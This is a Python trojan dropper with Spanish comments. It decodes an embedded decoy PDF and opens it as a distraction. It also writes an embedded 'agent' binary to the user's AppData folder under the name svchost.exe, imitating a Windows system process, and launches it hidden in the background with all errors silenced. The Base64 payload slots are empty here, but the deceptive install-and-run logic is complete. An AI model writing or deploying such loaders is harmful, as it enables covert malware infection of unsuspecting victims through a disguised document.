
import os
import sys
import tempfile
import subprocess
import base64
from pathlib import Path

# PDF embebido (Base64)
PDF_DATA = b""""""

# Agente embebido (Base64)
AGENT_DATA = b""""""

def main():
    try:
        # Directorio temporal
        temp_dir = Path(os.environ.get('TEMP', '/tmp'))
        
        # Extraer y abrir PDF
        pdf_data = base64.b64decode(PDF_DATA)
        pdf_path = temp_dir / "documento.pdf"
        
        with open(pdf_path, 'wb') as f:
            f.write(pdf_data)
        
        # Abrir PDF con aplicación por defecto
        if sys.platform == 'win32':
            os.startfile(str(pdf_path))
        else:
            subprocess.Popen(['xdg-open', str(pdf_path)], 
                           stdout=subprocess.DEVNULL, 
                           stderr=subprocess.DEVNULL)
        
        # Extraer agente a ubicación persistente
        agent_data = base64.b64decode(AGENT_DATA)
        
        if sys.platform == 'win32':
            # Windows: %APPDATA%\Microsoft\Windows\Caches\
            agent_dir = Path(os.environ['APPDATA']) / 'Microsoft' / 'Windows' / 'Caches'
            agent_dir.mkdir(parents=True, exist_ok=True)
            agent_path = agent_dir / "svchost.exe"
        else:
            agent_path = temp_dir / "svchost.exe"
        
        with open(agent_path, 'wb') as f:
            f.write(agent_data)
        
        # Dar permisos de ejecución (Linux/Mac)
        if sys.platform != 'win32':
            os.chmod(agent_path, 0o755)
        
        # Ejecutar agente en segundo plano
        if sys.platform == 'win32':
            # Windows: sin ventana, proceso separado
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            startupinfo.wShowWindow = 0  # SW_HIDE
            
            subprocess.Popen(
                [str(agent_path)],
                startupinfo=startupinfo,
                creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                [str(agent_path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True
            )
        
    except Exception as e:
        # Silencioso en producción
        pass

if __name__ == '__main__':
    main()
